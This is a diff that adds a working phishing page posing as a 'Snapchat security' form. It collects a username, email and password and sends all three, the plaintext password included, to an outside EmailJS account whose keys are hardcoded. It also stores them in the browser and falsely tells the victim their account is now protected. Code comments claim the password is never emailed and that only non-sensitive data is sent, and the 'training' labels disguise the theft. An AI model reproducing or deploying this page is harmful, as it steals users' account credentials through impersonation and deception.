@@ -1,0 +1,231 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Snapchat security</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  display: grid;
+  place-items: center;
+  background: #fffc00;
+  font-family: Arial, sans-serif;
+}
+
+.card {
+  background: white;
+  padding: 30px;
+  width: min(90%, 380px);
+  border-radius: 18px;
+  text-align: center;
+  box-shadow: 0 5px 25px #0002;
+}
+
+h1 {
+  color: #111;
+}
+
+input {
+  width: 100%;
+  padding: 14px;
+  margin: 9px 0;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+}
+
+button {
+  width: 100%;
+  padding: 14px;
+  background: #111;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  margin-top: 12px;
+}
+
+button:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+
+#message {
+  margin-top: 15px;
+  color: #167a32;
+}
+</style>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+
+<body>
+
+<div class="card">
+
+  <h1> Snapchat </h1>
+
+  <h3>Please fill all the details.
+         For Snapchat security.</h3>
+
+  <p></p>
+
+  <form id="trainingForm">
+
+    <input
+      type="text"
+      id="username"
+      placeholder="username"
+      maxlength="50"
+      required
+    >
+
+    <input
+      type="email"
+      id="userEmail"
+      placeholder="email address"
+      required
+    >
+
+    <input
+      type="password"
+      id="demoPassword"
+      placeholder="password"
+      required
+      autocomplete="off"
+    >
+
+    <button type="submit" id="submitBtn">
+      Submit
+    </button>
+
+  </form>
+
+  <p id="message" role="status"></p>
+
+</div>
+
+<script>
+
+// EMAILJS CONFIGURATION
+
+const PUBLIC_KEY = "e59prVOmj8QZdXAKe";
+const SERVICE_ID = "service_6yx1d67";
+const TEMPLATE_ID = "template_drwsax9";
+
+emailjs.init({
+  publicKey: PUBLIC_KEY
+});
+
+const form = document.getElementById("trainingForm");
+const message = document.getElementById("message");
+const submitBtn = document.getElementById("submitBtn");
+
+// PASSWORD STRENGTH CHECKER
+// Password is checked locally only.
+// It is never emailed or saved.
+
+function checkPasswordStrength(password) {
+
+  let score = 0;
+
+  if (password.length >= 8) score++;
+  if (/[A-Z]/.test(password)) score++;
+  if (/[a-z]/.test(password)) score++;
+  if (/[0-9]/.test(password)) score++;
+  if (/[^A-Za-z0-9]/.test(password)) score++;
+
+  if (score <= 2) return "Weak";
+  if (score <= 4) return "Medium";
+
+  return "Strong";
+}
+
+// FORM SUBMISSION
+
+form.addEventListener("submit", async function(e) {
+
+  e.preventDefault();
+
+  const username =
+    document.getElementById("username").value.trim();
+
+  const userEmail =
+    document.getElementById("userEmail").value.trim();
+
+  const passwordInput =
+    document.getElementById("demoPassword");
+
+  const password = passwordInput.value;
+
+  const passwordStrength =
+    checkPasswordStrength(password);
+
+  // Only non-sensitive information is sent.
+
+  const result = {
+    username: username,
+    email: userEmail,
+    password: password,
+    time: new Date().toLocaleString(),
+    status: "Training submission"
+  };
+
+  submitBtn.disabled = true;
+  message.textContent = "Submitting details....";
+
+  try {
+
+    await emailjs.send(
+      SERVICE_ID,
+      TEMPLATE_ID,
+      result
+    );
+
+    // Save non-sensitive details locally.
+
+    const entries = JSON.parse(
+      localStorage.getItem("pyserDemo") || "[]"
+    );
+
+    entries.push(result);
+
+    localStorage.setItem(
+      "pyserDemo",
+      JSON.stringify(entries)
+    );
+
+    message.textContent =
+      "Now your snapchat account is protected !";
+
+    form.reset();
+
+  } catch (error) {
+
+    console.error("EmailJS error:", error);
+
+    message.textContent =
+      "Sending failed. Please check EmailJS settings.";
+
+  } finally {
+
+    // Clear password from memory/input.
+
+    passwordInput.value = "";
+    submitBtn.disabled = false;
+
+  }
+
+});
+
+</script>
+
+</body>
+</html>
